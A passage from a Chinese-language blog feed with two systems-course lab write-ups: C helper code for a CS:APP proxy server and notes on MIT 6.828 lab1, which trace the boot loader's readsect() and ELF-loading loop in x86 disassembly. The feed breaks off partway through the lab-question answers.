class="keyword">void</span> <span class="title">ParseUrl</span><span class="params">(<span class="keyword">char</span> urltemp[],<span class="keyword">char</span> uri[],<span class="keyword">char</span> hostname[],<span class="keyword">char</span> port[],Headers* header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> url[MAXLINE];</span><br><span class="line"><span class="built_in">strcpy</span>(url,urltemp);</span><br><span class="line">  <span class="keyword">char</span> *ptr=<span class="built_in">strchr</span>(url,<span class="string">':'</span>);</span><br><span class="line">  <span class="keyword">char</span> *uri_ptr=<span class="built_in">strchr</span>(ptr+<span class="number">3</span>,<span class="string">'/'</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(uri,uri_ptr);</span><br><span class="line">  *uri_ptr=<span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(header-&gt;user_host,ptr+<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">char</span> *port_ptr=<span class="built_in">strchr</span>(ptr+<span class="number">3</span>,<span class="string">':'</span>);</span><br><span class="line">  <span class="keyword">if</span>(port_ptr==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(port,<span class="string">"80"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(port,port_ptr+<span class="number">1</span>);</span><br><span class="line">      *port_ptr=<span class="string">'\0'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(hostname,ptr+<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initHeader</span><span class="params">(Headers* header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_agent_hdr,user_agent_hdr);</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_connection,user_connection);</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_proxy_connection,user_proxy_connection);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRequestHeaders</span><span class="params">(<span class="keyword">rio_t</span> *rio,<span class="keyword">char</span> requestHeaders[],Headers *header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[MAXLINE],type[MAXLINE];</span><br><span class="line"><span class="keyword">int</span> rc,tc;</span><br><span class="line">initHeader(header);</span><br><span class="line"><span class="keyword">while</span>((rc=Rio_readlineb(rio,buf,MAXLINE))&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf,<span class="string">"\r\n"</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sscanf</span>(buf,<span class="string">"%s"</span>,type);</span><br><span class="line">tc=getRequestType(type);</span><br><span class="line"><span class="comment">//fprintf(stdout, "%s",buf );</span></span><br><span class="line"><span class="keyword">switch</span>(tc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">-1</span>:<span class="built_in">strcat</span>(requestHeaders,buf);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">strcpy</span>(header-&gt;user_host,buf);</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_agent_hdr);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_connection);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_proxy_connection);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_host);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,<span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * help function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintErrorHeader</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> status[],<span class="keyword">char</span>* shortMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXBUF];</span><br><span class="line">    <span class="comment">/*Send the HTTP response Header to client*/</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"HTTP/1.0 %s %s\r\n"</span>,status,shortMsg);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"%sServer: Yu Web Server\r\n"</span>, buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"%sConnection: close\r\n\r\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*send header to client &amp;&amp; log*/</span></span><br><span class="line">    rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    ServerPrintResponseHeader(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerPrintResponseHeader</span><span class="params">(<span class="keyword">char</span> *header)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Response headers:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, header);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerError</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *cause, <span class="keyword">char</span> status[], <span class="keyword">char</span> *shortMsg, <span class="keyword">char</span> *longMsg)</span> </span>&#123;</span><br><span class="line">    PrintErrorHeader(fd,status,shortMsg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sbuf function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> sp-&gt;buf=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</span><br><span class="line"> sp-&gt;n=n;</span><br><span class="line"> sp-&gt;front=sp-&gt;rear=<span class="number">0</span>;</span><br><span class="line"> Sem_init(&amp;sp-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"> Sem_init(&amp;sp-&gt;slots,<span class="number">0</span>,n);</span><br><span class="line"> Sem_init(&amp;sp-&gt;items,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Free(sp-&gt;buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">P(&amp;sp-&gt;slots);</span><br><span class="line">P(&amp;sp-&gt;mutex);</span><br><span class="line">sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)]=item;</span><br><span class="line">V(&amp;sp-&gt;mutex);</span><br><span class="line">V(&amp;sp-&gt;items);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> item;</span><br><span class="line">P(&amp;sp-&gt;items);</span><br><span class="line">P(&amp;sp-&gt;mutex);</span><br><span class="line">item=sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];</span><br><span class="line">V(&amp;sp-&gt;mutex);</span><br><span class="line">V(&amp;sp-&gt;slots);</span><br><span class="line"><span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(Cache *cache,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cache-&gt;cacheNum=n;</span><br><span class="line">cache-&gt;cacheItem=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheItem)*n);</span><br><span class="line">cache-&gt;usedCacheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">&#123;</span><br><span class="line">cache-&gt;cacheItem[i].useTime=<span class="number">0</span>;</span><br><span class="line">cache-&gt;cacheItem[i].readcnt=<span class="number">0</span>;</span><br><span class="line">Sem_init(&amp;cache-&gt;cacheItem[i].wt,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">Sem_init(&amp;cache-&gt;cacheItem[i].rd,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">Sem_init(&amp;cache-&gt;cacheItem[i].mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchCache</span><span class="params">(Cache *cache,<span class="keyword">char</span> *url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX_CACHE_NUM;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(url,cache-&gt;cacheItem[i].url)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考代码-3"><a href="#参考代码-3" class="headerlink" title="参考代码"></a>参考代码</h2><p><a href="https://github.com/FerricIron/CS-APP-Lab/tree/master/proxy/proxylab-handout" target="_blank" rel="noopener">ProxyLab源代码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ProxyLab&quot;&gt;&lt;a href=&quot;#ProxyLab&quot; class=&quot;headerlink&quot; title=&quot;ProxyLab&quot;&gt;&lt;/a&gt;ProxyLab&lt;/h1&gt;&lt;p&gt;这一次我们要实现一个自己的代理服务器!&lt;/p&gt;
&lt;h2 id=&quot;实验目标&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>mit6.828-lab1</title>
    <link href="lengyu.me/2018/10/23/mit6-828-lab1/"/>
    <id>lengyu.me/2018/10/23/mit6-828-lab1/</id>
    <published>2018-10-23T15:58:23.000Z</published>
    <updated>2019-07-28T15:41:39.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Booting-a-PC"><a href="#Booting-a-PC" class="headerlink" title="Booting a PC"></a>Booting a PC</h1><p>因为觉得这东西比较难，主要是比较繁琐，还是参考CSAPP的样子写一下博客记录一下，加深记忆</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><p>  gcc 4.8即可，不要用各大发行版自带的gcc, 选学优化会导致评分不准。</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>  严格按照他给的材料来安装他们自己倒腾出来的那个qemu，嫌麻烦也可以直接从包管理安装，但是据说会有点问题</p><h3 id="推荐环境"><a href="#推荐环境" class="headerlink" title="推荐环境"></a>推荐环境</h3><p>  如果嫌麻烦，可以考虑用manjaro这一类发行版一路yaourt 安装e即可，也可以用ubuntu按照他给的材料慢慢折腾。但是在我本机上没有成功编译他给出的编译链，我选择安装gcc 4.8来替代。</p><h2 id="一些比较重要的点"><a href="#一些比较重要的点" class="headerlink" title="一些比较重要的点"></a>一些比较重要的点</h2><h3 id="PC的物理地址"><a href="#PC的物理地址" class="headerlink" title="PC的物理地址"></a>PC的物理地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</span><br><span class="line">|      32-bit      |</span><br><span class="line">|  memory mapped   |</span><br><span class="line">|     devices      |</span><br><span class="line">|                  |</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">|                  |</span><br><span class="line">|      Unused      |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- depends on amount of RAM</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">| Extended Memory  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB)</span><br><span class="line">|     BIOS ROM     |</span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB)</span><br><span class="line">|  16-bit devices, |</span><br><span class="line">|  expansion ROMs  |</span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB)</span><br><span class="line">|   VGA Display    |</span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB)</span><br><span class="line">|                  |</span><br><span class="line">|    Low Memory    |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><h2 id="PC-Bootstrap"><a href="#PC-Bootstrap" class="headerlink" title="PC Bootstrap"></a>PC Bootstrap</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><blockquote><p>Exercise 1. Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html" target="_blank" rel="noopener">the 6.828 reference page</a>. You don’t have to read them now, but you’ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section “The Syntax” in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html" target="_blank" rel="noopener">Brennan’s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax we’ll be using with the GNU assembler in JOS.</p></blockquote><p>因为我已经从CSAPP 中学过部分x86汇编，所以大致瞟了一眼他给的材料，然后跳过</p><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><blockquote><p>Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm" target="_blank" rel="noopener">Phil Storrs I/O Ports Description</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html" target="_blank" rel="noopener">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>跟踪后发现BIOS首先设置了%SP，然后清楚了中断，然后是几个跳转。</p><h3 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h3><blockquote><p>Exercise 3. Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html" target="_blank" rel="noopener">lab tools guide</a>, especially the section on GDB commands. Even if you’re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code in <code>boot/boot.S</code>, using the source code and the disassembly file<code>obj/boot/boot.asm</code> to keep track of where you are. Also use the <code>x/i</code> command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly in <code>obj/boot/boot.asm</code> and GDB.</p><p>Trace into <code>bootmain()</code> in <code>boot/main.c</code>, and then into <code>readsect()</code>. Identify the exact assembly instructions that correspond to each of the statements in <code>readsect()</code>. Trace through the rest of <code>readsect()</code> and back out into <code>bootmain()</code>, and identify the begin and end of the <code>for</code> loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>readsect的c语言代码和汇编代码的对应关系:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">readsect(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// wait for disk to be ready</span></span><br><span class="line">waitdisk();</span><br><span class="line"></span><br><span class="line">outb(<span class="number">0x1F2</span>, <span class="number">1</span>);<span class="comment">// count = 1</span></span><br><span class="line">outb(<span class="number">0x1F3</span>, offset);</span><br><span class="line">outb(<span class="number">0x1F4</span>, offset &gt;&gt; <span class="number">8</span>);</span><br><span class="line">outb(<span class="number">0x1F5</span>, offset &gt;&gt; <span class="number">16</span>);</span><br><span class="line">outb(<span class="number">0x1F6</span>, (offset &gt;&gt; <span class="number">24</span>) | <span class="number">0xE0</span>);</span><br><span class="line">outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);<span class="comment">// cmd 0x20 - read sectors</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// wait for disk to be ready</span></span><br><span class="line">waitdisk();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read a sector</span></span><br><span class="line">insl(<span class="number">0x1F0</span>, dst, SECTSIZE/<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">00007c7c &lt;readsect&gt;:</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">readsect(void *dst, uint32_t offset)</span><br><span class="line">&#123;</span><br><span class="line">    7c7c:55                   push   %ebp</span><br><span class="line">    7c7d:89 e5                mov    %esp,%ebp</span><br><span class="line">    7c7f:57                   push   %edi</span><br><span class="line">    7c80:53                   push   %ebx</span><br><span class="line">    7c81:8b 5d 0c             mov    0xc(%ebp),%ebx</span><br><span class="line">// wait for disk to be ready</span><br><span class="line">waitdisk();</span><br><span class="line">    7c84:e8 e1 ff ff ff       call   7c6a &lt;waitdisk&gt;</span><br><span class="line">&#125;</span><br><span class="line">static inline void</span><br><span class="line">outb(int port, uint8_t data)</span><br><span class="line">&#123;</span><br><span class="line">asm volatile(&quot;outb %0,%w1&quot; : : &quot;a&quot; (data), &quot;d&quot; (port));</span><br><span class="line">    7c89:ba f2 01 00 00       mov    $0x1f2,%edx</span><br><span class="line">    7c8e:b0 01                mov    $0x1,%al</span><br><span class="line">    7c90:ee                   out    %al,(%dx)</span><br><span class="line">    7c91:0f b6 c3             movzbl %bl,%eax</span><br><span class="line">    7c94:b2 f3                mov    $0xf3,%dl</span><br><span class="line">    7c96:ee                   out    %al,(%dx)</span><br><span class="line">    7c97:0f b6 c7             movzbl %bh,%eax</span><br><span class="line">    7c9a:b2 f4                mov    $0xf4,%dl</span><br><span class="line">    7c9c:ee                   out    %al,(%dx)</span><br><span class="line"></span><br><span class="line">outb(0x1F2, 1);// count = 1</span><br><span class="line">outb(0x1F3, offset);</span><br><span class="line">outb(0x1F4, offset &gt;&gt; 8);</span><br><span class="line">outb(0x1F5, offset &gt;&gt; 16);</span><br><span class="line">    7c9d:89 d8                mov    %ebx,%eax</span><br><span class="line">    7c9f:b2 f5                mov    $0xf5,%dl</span><br><span class="line">    7ca1:c1 e8 10             shr    $0x10,%eax</span><br><span class="line">    7ca4:0f b6 c0             movzbl %al,%eax</span><br><span class="line">    7ca7:ee                   out    %al,(%dx)</span><br><span class="line">outb(0x1F6, (offset &gt;&gt; 24) | 0xE0);</span><br><span class="line">    7ca8:c1 eb 18             shr    $0x18,%ebx</span><br><span class="line">    7cab:b2 f6                mov    $0xf6,%dl</span><br><span class="line">    7cad:88 d8                mov    %bl,%al</span><br><span class="line">    7caf:83 c8 e0             or     $0xffffffe0,%eax</span><br><span class="line">    7cb2:ee                   out    %al,(%dx)</span><br><span class="line">    7cb3:b0 20                mov    $0x20,%al</span><br><span class="line">    7cb5:b2 f7                mov    $0xf7,%dl</span><br><span class="line">    7cb7:ee                   out    %al,(%dx)</span><br><span class="line">outb(0x1F7, 0x20);// cmd 0x20 - read sectors</span><br><span class="line"></span><br><span class="line">// wait for disk to be ready</span><br><span class="line">waitdisk();</span><br><span class="line">    7cb8:e8 ad ff ff ff       call   7c6a &lt;waitdisk&gt;</span><br><span class="line">asm volatile(&quot;cld\n\trepne\n\tinsl&quot;</span><br><span class="line">    7cbd:8b 7d 08             mov    0x8(%ebp),%edi</span><br><span class="line">    7cc0:b9 80 00 00 00       mov    $0x80,%ecx</span><br><span class="line">    7cc5:ba f0 01 00 00       mov    $0x1f0,%edx</span><br><span class="line">    7cca:fc                   cld    </span><br><span class="line">    7ccb:f2 6d                repnz insl (%dx),%es:(%edi)</span><br><span class="line"></span><br><span class="line">// read a sector</span><br><span class="line">insl(0x1F0, dst, SECTSIZE/4);</span><br><span class="line">&#125;</span><br><span class="line">    7ccd:5b                   pop    %ebx</span><br><span class="line">    7cce:5f                   pop    %edi</span><br><span class="line">    7ccf:5d                   pop    %ebp</span><br><span class="line">    7cd0:c3                   ret</span><br></pre></td></tr></table></figure><p>注意看汇编的outb部分，实际上通过一系列的硬编码把%ebx偏移位置的东西out到%dx里面。</p><p>这里主要是%ebx到%ax的构造。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7c91:0f b6 c3             movzbl %bl,%eax</span><br></pre></td></tr></table></figure><p>这一行是传递%bl的最低一个字节并且把其他字节填充为0也就是offset</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7c97:0f b6 c7             movzbl %bh,%eax</span><br></pre></td></tr></table></figure><p>这个就是传递%bh(bx的高8位)的最低一个字节并且把其他字节填充为0也就是offset&gt;&gt;8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7c9d:89 d8                mov    %ebx,%eax</span><br><span class="line">7c9f:b2 f5                mov    $0xf5,%dl</span><br><span class="line">7ca1:c1 e8 10             shr    $0x10,%eax</span><br></pre></td></tr></table></figure><p>这就是把%ebx送到%eax并且右移动16位，也就是offset&gt;&gt;16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7ca8:c1 eb 18             shr    $0x18,%ebx</span><br><span class="line">7cab:b2 f6                mov    $0xf6,%dl</span><br><span class="line">7cad:88 d8                mov    %bl,%al</span><br><span class="line">7caf:83 c8 e0             or     $0xffffffe0,%eax</span><br><span class="line">7cb2:ee                   out    %al,(%dx)</span><br></pre></td></tr></table></figure><p>这里是把%eax右移动24位送低8位到%eax,然后取|0xE0,然后out,也就是offset&gt;&gt;24| 0xE0</p><p>然后是识别循环部分，这一部分直接上汇编一行一行讲解(直接用地址代替行号)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   7d34:8d 98 00 00 01 00    lea    0x10000(%eax),%ebx</span><br><span class="line">eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">   7d3a:0f b7 05 2c 00 01 00 movzwl 0x1002c,%eax</span><br><span class="line">   7d41:c1 e0 05             shl    $0x5,%eax</span><br><span class="line">   7d44:8d 34 03             lea    (%ebx,%eax,1),%esi</span><br><span class="line">for (; ph &lt; eph; ph++)</span><br><span class="line">   7d47:39 f3                cmp    %esi,%ebx</span><br><span class="line">   7d49:73 16                jae    7d61 &lt;bootmain+0x57&gt;</span><br><span class="line">readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   7d4b:ff 73 04             pushl  0x4(%ebx)</span><br><span class="line">for (; ph &lt; eph; ph++)</span><br><span class="line">   7d4e:83 c3 20             add    $0x20,%ebx</span><br><span class="line">readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   7d51:ff 73 f4             pushl  -0xc(%ebx)</span><br><span class="line">   7d54:ff 73 ec             pushl  -0x14(%ebx)</span><br><span class="line">   7d57:e8 75 ff ff ff       call   7cd1 &lt;readseg&gt;</span><br><span class="line">for (; ph &lt; eph; ph++)</span><br><span class="line">   7d5c:83 c4 0c             add    $0xc,%esp</span><br><span class="line">   7d5f:eb e6                jmp    7d47 &lt;bootmain+0x3d&gt;</span><br></pre></td></tr></table></figure><p>7d34部分算出ph并且存在%ebx中，然后一波神奇的操作之后在7d44处算出了eph并且存在了%esi中，</p><p>接着判断$eph\geq ph$是否成立,如果不成立就正常的通过各种操作存参数，传参数，然后调用readseg,注意7d4e，这一行让%ebx增加0x20,也就是执行了ph++。如果成立就跳到7d61,也就是执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</span><br></pre></td></tr></table></figure><p>这一行跳转到了0x10000c位置，从这里开始，就是kernel部分了。</p><blockquote><p>Be able to answer the following questions:</p><ul><li>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</li><li>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded? </li><li>Where is the first instruction of the kernel?</li><li>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</li></ul></blockquote><p>这四个问题其实代码里面都有答案</p><ol><li>这一部分在附录A和boot.S里面有提及</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 